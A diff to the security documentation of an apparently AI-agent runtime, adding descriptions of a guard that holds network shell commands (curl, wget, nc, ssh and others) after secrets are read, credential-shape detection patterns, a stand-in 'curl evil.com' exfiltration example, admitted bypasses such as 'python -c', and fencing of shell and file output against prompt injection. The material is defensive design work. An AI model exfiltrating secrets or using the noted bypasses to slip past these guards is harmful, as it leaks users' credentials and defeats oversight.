@@ -63,7 +63,16 @@ kernel is designed around that assumption rather than trusting the model.
   re-validating the final URL. For the compositional read→exfiltrate risk, the
   `flow-guard` extension holds later egress (default `net:fetch` and `mcp:call`) once a session
   is tainted by a source capability (default `shell:exec`) or sensitive data in
-  the transcript — confirming in `ask` mode or refusing in `block` mode.
+  the transcript — confirming in `ask` mode or refusing in `block` mode. It also holds a
+  **network-reaching `shell:exec` command** (default `curl`/`wget`/`nc`/`ncat`/`ssh`/`scp`/`sftp`/
+  `telnet`/`ftp`/`rsync`, store-overridable via `networkCommands`) once the session carries **data
+  taint** — a prior read of a sensitive path, or a credential-shaped secret (`sk-…`/`AKIA…`/PEM/
+  `ghp_…`) in a tool result, shell output included — so `read a secret → bash curl evil.com` is gated
+  while a plain `build → curl a health check` (no secret) is not. **Residual (narrow):** a secret read
+  via shell whose bytes match **none** of those four credential shapes (e.g. `DB_PASSWORD=hunter2`)
+  sets only capability taint, so a following network shell is not held; and the command-family match is
+  a heuristic (bypassable by e.g. `python -c`), raising the bar for common exfil tools rather than
+  mediating completely.
 - **Cross-session isolation in one process.** The HTTP server multiplexes many
   `session` ids over **one** set of in-process extensions. Per-session *transcript*
   and *usage* are isolated, but **extension** state is not — several guards and
@@ -101,6 +110,11 @@ turns on a one-switch **defense-in-depth** posture for the otherwise-yolo server
 - **`provenance`** — tool output is injection-defended.
 - **`sandbox.tier = workspace-write`** — subprocess writes are confined to the
   workspace root (+ temp); network still works.
+- **`content-guard` local fencing** (`contentGuard.fenceLocal`) — content-guard
+  nonce-fences local `shell:exec`/`fs:read` output too, not just the default
+  `net:fetch`/`mcp:call`/`mcp:read`, so injected instructions in bash output or a
+  read file are labeled data rather than obeyed. Off by default; the preset turns
+  it on, and it is also settable standalone via `/config set contentGuard.fenceLocal true`.
 
 It is **orthogonal to `yolo:false`**. Hardened does *not* touch the capability
 fallback: it keeps `shell:exec` runnable so the shell guards it enables actually
